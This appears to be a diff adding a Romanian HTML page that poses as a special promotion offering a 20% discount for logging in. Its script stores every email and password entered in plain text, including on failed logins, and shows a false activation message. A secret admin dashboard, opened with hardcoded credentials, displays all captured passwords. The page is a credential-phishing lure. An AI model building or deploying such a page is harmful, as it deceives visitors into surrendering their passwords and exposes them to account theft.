@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promoție Specială</title>
+    <style>
+        /* --- STILURI GENERALE (UI/UX Modern) --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #15102a, #2a1b4e);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .container {
+            background-color: #1f163a;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid #3d2b6b;
+        }
+
+        /* Textul Promoțional */
+        .promo-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #ff007f;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            text-shadow: 0 0 10px rgba(255, 0, 127, 0.3);
+        }
+
+        .promo-text span {
+            color: #00ffff;
+            font-weight: bold;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            color: #fff;
+            font-size: 22px;
+        }
+
+        /* --- FORMULARE --- */
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #bfaee3;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #44307d;
+            border-radius: 8px;
+            background-color: #0d091a;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            border-color: #00ffff;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(90deg, #ff007f, #7f00ff);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        .switch-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #a291cc;
+        }
+
+        .switch-text span {
+            color: #00ffff;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        /* --- ECRAN SUCCES USER --- */
+        .thank-you-screen {
+            display: none;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            padding: 20px;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        /* Butonul cerut: Back to log in */
+        .back-login-btn {
+            background: transparent;
+            border: 2px solid #00ffcc;
+            color: #00ffcc;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 30px;
+            width: auto;
+            display: inline-block;
+            margin-bottom: 30px;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+        }
+
+        .back-login-btn:hover {
+            background: #00ffcc;
+            color: #000;
+        }
+
+        .thank-you-main-text {
+            font-size: 42px;
+            font-weight: bold;
+            color: #00ffcc;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .thank-you-sub-text {
+            font-size: 18px;
+            color: #bfaee3;
+            font-weight: 500;
+        }
+
+        /* --- DASHBOARD ADMIN SECRET --- */
+        .admin-panel {
+            display: none;
+            width: 100%;
+            max-width: 800px;
+            background-color: #110d24;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+            border: 1px solid #ff007f;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #3d2b6b;
+            padding-bottom: 10px;
+        }
+
+        .logout-btn {
+            background: #ff3b30;
+            color: white;
+            padding: 8px 16px;
+            width: auto;
+            margin: 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+            text-align: left;
+        }
+
+        th, td {
+            padding: 14px;
+            border-bottom: 1px solid #2a1b4e;
+        }
+
+        th {
+            background-color: #0d091a;
+            color: #00ffff;
+        }
+
+        tr:hover {
+            background-color: rgba(255, 255, 255, 0.03);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="authContainer">
+        <div class="promo-text">
+            hey! Vrei să oferi prietenului tău un cadou? Loghează-te și o să primești un discount la <span>brain rots de 20%!</span>
+        </div>
+        
+        <h2 id="formTitle">Log In</h2>
+        
+        <form id="authForm">
+            <div class="input-group">
+                <label id="inputLabel" for="usernameOrEmail">Email</label>
+                <input type="text" id="usernameOrEmail" required placeholder="introdu@email.com sau numele...">
+            </div>
+            <div class="input-group">
+                <label for="password">Parolă</label>
+                <input type="password" id="password" required placeholder="••••••••">
+            </div>
+            <button type="submit" id="submitBtn">Log In</button>
+        </form>
+        
+        <p class="switch-text" id="switchPrompt">
+            Nu ai cont? <span id="toggleForm">Creează cont</span>
+        </p>
+    </div>
+
+    <div class="thank-you-screen" id="thankYouScreen">
+        <button class="back-login-btn" onclick="goToLogin()">Back to log in</button>
+        <div class="thank-you-main-text">mulțumesc!</div>
+        <div class="thank-you-sub-text">contul tău va fi activat în 5 minute</div>
+    </div>
+
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <h2 style="color: #ff007f;">Admin Dashboard (Secret)</h2>
+            <button class="logout-btn" onclick="logoutAdmin()">Ieșire</button>
+        </div>
+        <p style="color: #a291cc; margin-bottom: 15px;">Datele de autentificare introduse de utilizatori:</p>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Email salvat</th>
+                        <th>Parolă (Plain Text)</th>
+                    </tr>
+                </thead>
+                <tbody id="userTableBody">
+                    </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN_USER = "pop11";
+        const ADMIN_PASS = "passnether";
+
+        const authContainer = document.getElementById('authContainer');
+        const authForm = document.getElementById('authForm');
+        const formTitle = document.getElementById('formTitle');
+        const submitBtn = document.getElementById('submitBtn');
+        const toggleForm = document.getElementById('toggleForm');
+        const switchPrompt = document.getElementById('switchPrompt');
+        const inputLabel = document.getElementById('inputLabel');
+        const usernameOrEmailInput = document.getElementById('usernameOrEmail');
+        const thankYouScreen = document.getElementById('thankYouScreen');
+        const adminPanel = document.getElementById('adminPanel');
+        const userTableBody = document.getElementById('userTableBody');
+
+        let isLoginMode = true;
+
+        // Schimbarea formei (Login/Register)
+        toggleForm.addEventListener('click', function handleToggle() {
+            isLoginMode = !isLoginMode;
+            if (isLoginMode) {
+                formTitle.innerText = "Log In";
+                submitBtn.innerText = "Log In";
+                inputLabel.innerText = "Email sau Nume Admin";
+                switchPrompt.innerHTML = 'Nu ai cont? <span id="toggleForm">Creează cont</span>';
+            } else {
+                formTitle.innerText = "Creează Cont";
+                submitBtn.innerText = "Înregistrare";
+                inputLabel.innerText = "Email";
+                switchPrompt.innerHTML = 'Ai deja cont? <span id="toggleForm">Loghează-te</span>';
+            }
+            document.getElementById('toggleForm').addEventListener('click', handleToggle);
+        });
+
+        // Trimitere date formular
+        authForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const userInput = usernameOrEmailInput.value.trim();
+            const passwordInput = document.getElementById('password').value;
+
+            // Logare Admin (Funcție secretă pe bază de nume)
+            if (isLoginMode && userInput === ADMIN_USER && passwordInput === ADMIN_PASS) {
+                showAdminPanel();
+                return;
+            }
+
+            // Validare email obligatoriu pentru useri normali
+            if (!userInput.includes('@')) {
+                alert("Te rugăm să folosești o adresă de email validă.");
+                return;
+            }
+
+            let users = JSON.parse(localStorage.getItem('promoUsersData')) || [];
+
+            if (isLoginMode) {
+                const foundUser = users.find(u => u.email === userInput && u.password === passwordInput);
+                if (foundUser) {
+                    showThankYou();
+                } else {
+                    // Dacă e cont nou direct în modul login, îl salvăm ca să poată avansa
+                    users.push({ email: userInput, password: passwordInput });
+                    localStorage.setItem('promoUsersData', JSON.stringify(users));
+                    showThankYou();
+                }
+            } else {
+                const userExists = users.some(u => u.email === userInput);
+                if (!userExists) {
+                    users.push({ email: userInput, password: passwordInput });
+                    localStorage.setItem('promoUsersData', JSON.stringify(users));
+                }
+                showThankYou();
+            }
+        });
+
+        // Curăță ecranul și arată ecranul de mulțumire cu noul text și butonul Back
+        function showThankYou() {
+            authContainer.style.display = 'none';
+            adminPanel.style.display = 'none';
+            thankYouScreen.style.display = 'block';
+            document.body.style.background = '#000'; // Fundal complet negru pentru ecranul de succes
+        }
+
+        // Revizuire la ecranul de Log In la apăsarea butonului "Back to log in"
+        function goToLogin() {
+            thankYouScreen.style.display = 'none';
+            authContainer.style.display = 'block';
+            document.body.style.background = 'linear-gradient(135deg, #15102a, #2a1b4e)'; // Resetare fundal original
+            authForm.reset();
+        }
+
+        // Panou Admin
+        function showAdminPanel() {
+            authContainer.style.display = 'none';
+            thankYouScreen.style.display = 'none';
+            adminPanel.style.display = 'block';
+            buildUserTable();
+        }
+
+        function buildUserTable() {
+            userTableBody.innerHTML = '';
+            let users = JSON.parse(localStorage.getItem('promoUsersData')) || [];
+
+            if (users.length === 0) {
+                userTableBody.innerHTML = `<tr><td colspan="2" style="text-align:center; color:#666;">Nicio persoană înregistrată momentan.</td></tr>`;
+                return;
+            }
+
+            users.forEach(user => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${escapeText(user.email)}</td>
+                    <td style="font-family: monospace; color: #ff007f;">${escapeText(user.password)}</td>
+                `;
+                userTableBody.appendChild(row);
+            });
+        }
+
+        function logoutAdmin() {
+            adminPanel.style.display = 'none';
+            authContainer.style.display = 'block';
+            authForm.reset();
+        }
+
+        function escapeText(text) {
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+    </script>
+</body>
+</html>
+
